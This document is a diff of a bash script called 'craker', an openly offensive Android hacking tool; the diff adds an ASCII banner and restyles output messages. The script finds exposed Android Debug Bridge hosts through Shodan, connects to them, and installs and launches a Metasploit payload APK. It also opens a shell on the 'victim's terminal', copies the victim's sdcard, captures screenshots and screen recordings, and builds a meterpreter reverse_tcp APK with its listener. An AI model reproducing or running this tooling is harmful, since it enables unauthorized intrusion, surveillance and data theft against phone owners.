@@ -3,6 +3,7 @@ trap ctrl_c INT
 ctrl_c(){
 echo -en "\e[0mDo you want to get out of craker ? \e[2my/n\e[0m "
 read e
+
 if [[ $e == "y" ]]
 then
 echo -e "\e[31mExiting..\e[0m"
@@ -16,14 +17,25 @@ ctrl_c
 fi
 }
 
+banner(){
+echo -e "
+\e[1;$1m ▄▄· ▄▄▄   ▄▄▄· ▄ •▄ ▄▄▄ .▄▄▄
+▐█ ▌▪▀▄ █·▐█ ▀█ █▌▄▌▪▀▄.▀·▀▄ █·
+██ ▄▄▐▀▀▄ ▄█▀▀█ ▐▀▀▄·▐▀▀▪▄▐▀▀▄
+▐███▌▐█•█▌▐█ ▪▐▌▐█.█▌▐█▄▄▌▐█•█▌
+·▀▀▀ .▀  ▀ ▀  ▀ ·▀  ▀ ▀▀▀ .▀  ▀\e[0m"
+}
+
 craker(){
 if [[ $@ == "--help" ]]
 then
+banner 34
 echo -e "./craker --adb \e[2mAdb hacking tool\e[0m"
 echo -e "./craker --msfpay \e[2mCreated payload apk\e[0m"
 echo -e "./craker --uppay \e[2mUp to payloads\e[0m"
 elif [[ $@ == "--adb" ]]
 then
+banner 35
 echo -e "adb: --find \e[2mFind vulnerable ip\e[0m"
 echo -e "adb: --upload <paylaod> \e[2mUpload payload\e[0m"
 echo -e "adb: --shell \e[2mConnect to the victim's terminal\e[0m"
@@ -37,89 +49,70 @@ echo -e "adb: --record <minutes> <filename> \e[2mScreenrecord devices\e[0m"
 echo -e "adb: --packages \e[2mView installed packages\e[0m"
 elif [[ $2 == "--find" ]]
 then
-echo -e "Looking for vulnerable ip \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Looking for vulnerable ip "
 curl -s "https://www.shodan.io/search?query=Android+Debug+Bridge" -o androids.txt
 cat androids.txt | grep "host" | awk '{print $3}' >> dumps.txt
 cat dumps.txt | grep "host" | tr '""<>/=' " " | awk '{print $3}'
 rm *.txt
-echo -en "\e[0m"
 elif [[ $2 == "--upload" ]]
 then
-echo -e "Uploading and installing $apk \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Uploading and installing $apk "
 adb install -r $3.apk
 adb shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1
-echo -en "\e[0m"
 elif [[ $2 == "--shell" ]]
 then
-echo -e "Connect to victim terminal \e[2m[*]\e[0m"
+echo -e "\e[34m[+]\e[0m Connect to victim terminal "
 adb shell
 elif [[ $2 == "--download" ]]
 then
-echo -e "Download sdcard victim \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Download sdcard victim "
 mkdir $4 
 adb pull -p -a $3 $4
-echo -en "\e[0m"
 elif [[ $2 == "--connect" ]]
 then
-echo -e "Connect device $3 \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Connect device $3 "
 adb connect $3:5555
-echo -en "\e[0m"
 elif [[ $2 == "--disconnect" ]]
 then
-echo -e "Disconnect devices \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Disconnect devices"
 adb disconnect
-echo -en "\e[0m"
 elif [[ $2 == "--view" ]]
 then
-echo -en "View devices \e[2m[*]\e[0m\e[2m"
+echo -en "\e[34m[+]\e[0m View devices "
 adb devices | grep "device" | awk '{print $1}' | tr 'List' ' '
-echo -en "\e[0m"
 elif [[ $2 == "--screen" ]]
 then
-echo -e "Screencap devices \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Screencap devices "
 adb shell screencap /sdcard/$3.png
 adb pull -p -a /sdcard/$3.png ../craker
 adb shell rm /sdcard/*.png
-echo -en "\e[0m"
 elif [[ $2 == "--model" ]]
 then
-echo -e "Model devices \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Model devices "
 adb devices -l | grep "model" | awk '{print $4}'
-echo -en "\e[0m"
 elif [[ $2 == "--record" ]]
 then
-echo -e "Screenrecord devices \e[2m[*]\e[0m"
-echo -en "\e[2mRecording $3 minutes [\e[0m\e[32m*\e[0m\e[2m] "
+echo -e "\e[34m[+]\e[0m Screenrecord devices "
+echo -e "\e[34m[+]\e[0m Recording $3 minutes "
 adb shell screenrecord --time-limit $3 /sdcard/$4.mp4
 adb pull -p -a /sdcard/$4.mp4 ../craker
 adb shell rm /sdcard/*.mp4
-echo -en "\e[0m"
 elif [[ $2 == "--packages" ]]
 then
-echo -e "View packages \e[2m[*]\e[0m"
-echo -e "\e[2m"
+echo -e "\e[34m[+]\e[0m View packages"
 adb shell pm list packages
-echo -e "\e[0m"
 elif [[ $@ == "--msfpay" ]]
 then
+banner 36
 echo -e "msfpay: --crp <name> <host> <port> \e[2mCreated payload\e[0m"
 echo -e "msfpay: --cop <name> <host> <port> \e[2mConnect payload\e[0m"
 elif [[ $2 == "--crp" ]]
 then
-echo -e "Created payload \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m Created payload"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$4 LPORT=$5 R > $3.apk
-echo -en "\e[0m"
 elif [[ $2 == "--cop" ]]
 then 
-echo -e "Connect payload \e[2m[*]\e[0m"
+echo -e "\e[34m[+]\e[0m Connect payload "
 echo "use multi/handler
 set payload android/meterpreter/reverse_tcp
 set lhost $4
@@ -128,14 +121,13 @@ run " > $3.rc
 msfconsole -r $3.rc 
 elif [[ $@ == "--uppay" ]]
 then
+banner 37
 echo -e "uppay: --backup <file> \e[2mFile to up \e[0m"
 elif [[ $2 == "--backup" ]]
 then
-echo -e "File to up $3 \e[2m[*]\e[0m"
-echo -en "\e[2m"
+echo -e "\e[34m[+]\e[0m File to up $3 "
 python -m webbrowser -n http://localhost:8080/$3
 php -S localhost:8000 | grep 'http'
-echo -en "\e[0m"
 else
 echo -e "use: ./craker --help"
 fi
